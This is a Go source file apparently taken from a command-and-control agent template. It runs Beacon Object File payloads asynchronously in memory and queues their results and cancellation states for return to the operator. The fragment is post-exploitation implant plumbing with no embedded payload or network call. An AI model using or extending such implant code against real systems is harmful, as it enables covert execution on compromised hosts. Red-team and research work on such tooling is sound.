package main

import (
	"fmt"
	"strconv"
	"sync"

	"__NAME__/impl"
	"__NAME__/protocol"
)

var (
	asyncJobsMu     sync.Mutex
	asyncJobObjects [][]byte
)

func taskRefFromCommand(task string, fallback uint) string {
	if task != "" {
		return task
	}
	return strconv.FormatUint(uint64(fallback), 10)
}

func queueAsyncJobObject(commandID uint, taskID string, payload interface{}) error {
	data, err := protocol.Marshal(payload)
	if err != nil {
		return err
	}
	jobData, err := protocol.Marshal(protocol.Job{CommandId: commandID, JobId: taskID, Data: data})
	if err != nil {
		return err
	}
	asyncJobsMu.Lock()
	asyncJobObjects = append(asyncJobObjects, jobData)
	asyncJobsMu.Unlock()
	return nil
}

func drainAsyncJobObjects() [][]byte {
	asyncJobsMu.Lock()
	defer asyncJobsMu.Unlock()
	if len(asyncJobObjects) == 0 {
		return nil
	}
	out := make([][]byte, len(asyncJobObjects))
	copy(out, asyncJobObjects)
	asyncJobObjects = nil
	return out
}

func runAsyncBof(object []byte, argsPack string, taskID string, jobID uint32) {
	jobs.SetState(jobID, impl.JobStateRunning)
	_ = queueAsyncJobObject(protocol.COMMAND_EXEC_BOF_ASYNC, taskID, protocol.AnsExecBofAsync{Start: true, Finish: false, Msgs: []byte{}})

	stopCh, _ := jobs.StopSignal(jobID)
	go func() {
		defer jobs.Remove(jobID)

		select {
		case <-stopCh:
			msgs, _ := protocol.Marshal([]protocol.BofMsg{{Type: protocol.CALLBACK_ERROR, Data: []byte("async BOF canceled before execution")}})
			jobs.SetState(jobID, impl.JobStateStopped)
			_ = queueAsyncJobObject(protocol.COMMAND_EXEC_BOF_ASYNC, taskID, protocol.AnsExecBofAsync{Msgs: msgs, Finish: true})
			return
		default:
		}

		ctx := impl.ObjectExecute(object, []byte(argsPack))
		if ctx == nil {
			msgs, _ := protocol.Marshal([]protocol.BofMsg{{Type: protocol.CALLBACK_ERROR, Data: []byte("async BOF execution failed: no context")}})
			jobs.SetState(jobID, impl.JobStateFinished)
			_ = queueAsyncJobObject(protocol.COMMAND_EXEC_BOF_ASYNC, taskID, protocol.AnsExecBofAsync{Msgs: msgs, Finish: true})
			return
		}

		ctx.Drain()
		msgs := append([]protocol.BofMsg(nil), ctx.Msgs...)

		select {
		case <-stopCh:
			msgs = append(msgs, protocol.BofMsg{Type: protocol.CALLBACK_ERROR, Data: []byte("async BOF canceled")})
			jobs.SetState(jobID, impl.JobStateStopped)
		default:
			jobs.SetState(jobID, impl.JobStateFinished)
		}

		msgsData, err := protocol.Marshal(msgs)
		if err != nil {
			msgsData, _ = protocol.Marshal([]protocol.BofMsg{{Type: protocol.CALLBACK_ERROR, Data: []byte(fmt.Sprintf("marshal async BOF messages: %v", err))}})
		}

		_ = queueAsyncJobObject(protocol.COMMAND_EXEC_BOF_ASYNC, taskID, protocol.AnsExecBofAsync{Msgs: msgsData, Finish: true})
	}()
}
